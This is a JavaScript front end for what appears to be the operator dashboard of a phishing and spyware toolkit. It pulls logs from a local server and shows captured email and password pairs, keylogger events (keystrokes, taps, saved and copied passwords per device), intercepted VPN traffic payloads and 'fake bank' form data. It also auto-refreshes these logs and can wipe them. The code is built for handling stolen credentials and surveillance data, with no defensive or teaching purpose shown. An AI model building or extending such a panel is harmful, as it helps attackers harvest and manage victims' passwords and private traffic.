// --- Глобальные массивы и состояния сортировки ---
let logs = [];
let keyloggerLogs = [];
let vpnLogs = [];
let fakeBankLogs = [];
let sortAsc = false; // false = новые сверху, true = старые сверху
let keyloggerSortAsc = false;
let vpnSortAsc = false;
let fakeBankSortAsc = false;

document.getElementById('clearServerBtn').addEventListener('click', async () => {
  try {
    const res = await fetch('http://localhost:3000/logs', {
      method: 'DELETE',
    });
    if (res.ok) {
      logs = [];
      renderLogs();
    } else {
      alert('Ошибка при удалении логов');
    }
  } catch (e) {
    alert('Сервер недоступен');
  }
});

document.getElementById('clearKeyloggerServerBtn').addEventListener('click', async () => {
  try {
    const res = await fetch('http://localhost:3000/keylogger-logs', {
      method: 'DELETE',
    });
    if (res.ok) {
      renderKeyloggerLogs([]);
    } else {
      alert('Ошибка при удалении keylogger логов');
    }
  } catch (e) {
    alert('Сервер недоступен');
  }
});

// Очистка fake bank логов
const clearFakeBankBtn = document.getElementById('clearFakeBankServerBtn');
if (clearFakeBankBtn) {
  clearFakeBankBtn.addEventListener('click', async () => {
    try {
      const res = await fetch('http://localhost:3000/fake-bank-logs', { method: 'DELETE' });
      if (res.ok) {
        fakeBankLogs = [];
        renderFakeBankLogs();
      } else {
        alert('Ошибка при удалении fake bank логов');
      }
    } catch (e) {
      alert('Сервер недоступен');
    }
  });
}

async function loadLogs() {
  try {
    const res = await fetch('http://localhost:3000/logs');
    logs = await res.json();
    logs.sort((a, b) => sortAsc ? a.id - b.id : b.id - a.id);
    renderLogs();
  } catch (err) {
    alert('Ошибка загрузки логов: ' + err.message);
  }
}

function renderLogs() {
  const tbody = document.querySelector('#logTable tbody');
  tbody.innerHTML = '';
  logs.filter(log => log.email || log.password).forEach(log => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${log.id}</td>
      <td>${log.email || ''}</td>
      <td>${log.password || ''}</td>
      <td>${new Date(log.timestamp).toLocaleString()}</td>
    `;
    tbody.appendChild(row);
  });
}

function clearView() {
  const tbody = document.querySelector('#logTable tbody');
  tbody.innerHTML = ''; // очищаем DOM
  logs = [];            // очищаем массив логов
}


function sortLogs() {
  sortAsc = !sortAsc;
  logs.sort((a, b) => sortAsc ? a.id - b.id : b.id - a.id);
  renderLogs();
}

function showTab(tab) {
  document.getElementById('classicTab').style.display = tab === 'classic' ? '' : 'none';
  document.getElementById('keyloggerTab').style.display = tab === 'keylogger' ? '' : 'none';
  document.getElementById('vpnTab').style.display = tab === 'vpn' ? '' : 'none';
  document.getElementById('tabClassic').disabled = tab === 'classic';
  document.getElementById('tabKeylogger').disabled = tab === 'keylogger';
  document.getElementById('tabVpn').disabled = tab === 'vpn';
}

async function loadKeyloggerLogs() {
  try {
    const res = await fetch('http://localhost:3000/keylogger-logs');
    keyloggerLogs = await res.json();
    if (!Array.isArray(keyloggerLogs)) {
      keyloggerLogs = Object.values(keyloggerLogs);
    }
    keyloggerLogs.sort((a, b) => keyloggerSortAsc ? a.id - b.id : b.id - a.id);
    renderKeyloggerLogs();
  } catch (err) {
    alert('Ошибка загрузки keylogger логов: ' + err.message);
  }
}

function parseKeyloggerEvent(event) {
  if (event.startsWith('tap:')) {
    const match = event.match(/x=([\d.]+), y=([\d.]+)/);
    if (match) {
      return { type: 'Tap', details: `x=${match[1]}, y=${match[2]}` };
    }
    return { type: 'Tap', details: event };
  } else if (event.startsWith('add password:')) {
    return { type: 'Добавлен пароль', details: event.replace('add password:', '').trim() };
  } else if (event.startsWith('edit password:')) {
    return { type: 'Изменён пароль', details: event.replace('edit password:', '').trim() };
  } else if (event.startsWith('save password:')) {
    return { type: 'Сохранён пароль', details: event.replace('save password:', '').trim() };
  } else if (event.startsWith('key:')) {
    return { type: 'Ввод символа', details: event.replace('key:', '').trim() };
  } else if (event.startsWith('copy:')) {
    return { type: 'Копирование', details: event.replace('copy:', '').trim() };
  } else if (event.startsWith('generate password:')) {
    return { type: 'Генерация пароля', details: event.replace('generate password:', '').trim() };
  }
  return { type: 'Другое', details: event };
}

function renderKeyloggerLogs() {
  const tbody = document.querySelector('#keyloggerLogTable tbody');
  tbody.innerHTML = '';
  (keyloggerLogs || []).forEach(log => {
    if (!log || typeof log.event !== 'string') return;
    const parsed = parseKeyloggerEvent(log.event);
    let time = log.timestamp ? new Date(log.timestamp).toLocaleString() : '';
    tbody.innerHTML += `
      <tr>
        <td>${log.id}</td>
        <td>${parsed.type}</td>
        <td>${parsed.details}</td>
        <td>${log.deviceId || log.device_id || ''}</td>
        <td>${time}</td>
      </tr>
    `;
  });
}

function sortKeyloggerLogs() {
  keyloggerSortAsc = !keyloggerSortAsc;
  keyloggerLogs.sort((a, b) => keyloggerSortAsc ? a.id - b.id : b.id - a.id);
  renderKeyloggerLogs();
}

async function loadVpnLogs() {
  try {
    const res = await fetch('http://localhost:3000/vpn-logs');
    vpnLogs = await res.json();
    vpnLogs.sort((a, b) => vpnSortAsc ? a.id - b.id : b.id - a.id);
    renderVpnLogs();
  } catch (err) {
    alert('Ошибка загрузки vpn логов: ' + err.message);
  }
}

function renderVpnLogs() {
  const tbody = document.querySelector('#vpnLogTable tbody');
  tbody.innerHTML = '';
  (vpnLogs || []).filter(log => log.src_ip && log.dst_ip && log.protocol && log.payload).forEach(log => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${log.id || ''}</td>
      <td>${log.device_id || ''}</td>
      <td>${log.src_ip || ''}</td>
      <td>${log.dst_ip || ''}</td>
      <td>${log.protocol || ''}</td>
      <td>${log.payload || ''}</td>
      <td>${log.timestamp ? new Date(log.timestamp).toLocaleString() : ''}</td>
    `;
    tbody.appendChild(row);
  });
}

function sortVpnLogs() {
  vpnSortAsc = !vpnSortAsc;
  vpnLogs.sort((a, b) => vpnSortAsc ? a.id - b.id : b.id - a.id);
  renderVpnLogs();
}

async function loadFakeBankLogs() {
  try {
    const res = await fetch('http://localhost:3000/fake-bank-logs');
    fakeBankLogs = await res.json();
    fakeBankLogs.sort((a, b) => fakeBankSortAsc ? a.id - b.id : b.id - a.id);
    renderFakeBankLogs();
  } catch (err) {
    alert('Ошибка загрузки fake bank логов: ' + err.message);
  }
}

function renderFakeBankLogs() {
  const tbody = document.querySelector('#fakeBankLogTable tbody');
  tbody.innerHTML = '';
  (fakeBankLogs || []).forEach(log => {
    if (!log) return;
    let dataStr = '';
    if (typeof log.data === 'object' && log.data !== null) {
      dataStr = Object.entries(log.data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>');
    } else {
      dataStr = String(log.data);
    }
    let time = log.timestamp ? new Date(log.timestamp).toLocaleString() : '';
    tbody.innerHTML += `
      <tr>
        <td>${log.id}</td>
        <td>${log.type}</td>
        <td>${dataStr}</td>
        <td>${time}</td>
      </tr>
    `;
  });
}

function sortFakeBankLogs() {
  fakeBankSortAsc = !fakeBankSortAsc;
  fakeBankLogs.sort((a, b) => fakeBankSortAsc ? a.id - b.id : b.id - a.id);
  renderFakeBankLogs();
}

function clearVpnView() {
  const tbody = document.querySelector('#vpnLogTable tbody');
  tbody.innerHTML = '';
  vpnLogs = [];
}

async function clearVpnServer() {
  try {
    const res = await fetch('http://localhost:3000/vpn-logs', { method: 'DELETE' });
    if (res.ok) {
      vpnLogs = [];
      renderVpnLogs();
    } else {
      alert('Ошибка при удалении vpn логов');
    }
  } catch (e) {
    alert('Сервер недоступен');
  }
}

// Автообновление для всех вкладок
setInterval(() => {
  if (document.getElementById('classicTab').style.display !== 'none') loadLogs();
  if (document.getElementById('keyloggerTab').style.display !== 'none') loadKeyloggerLogs();
  if (document.getElementById('vpnTab').style.display !== 'none') loadVpnLogs();
  if (document.getElementById('fakeBankTab').style.display !== 'none') loadFakeBankLogs();
}, 5000);

// Загрузка при старте
loadLogs();
showTab('classic');
